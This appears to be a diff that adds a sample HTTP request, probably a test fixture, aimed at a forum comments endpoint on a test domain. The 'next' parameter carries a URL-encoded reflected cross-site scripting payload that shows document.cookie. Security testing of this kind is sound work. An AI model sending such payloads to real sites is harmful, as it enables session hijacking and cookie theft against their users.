@@ -1,0 +1,4 @@
+GET /comments?next=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E HTTP/1.1
+Host: forum.example.test
+User-Agent: sample-client/1.0
+Accept: text/html
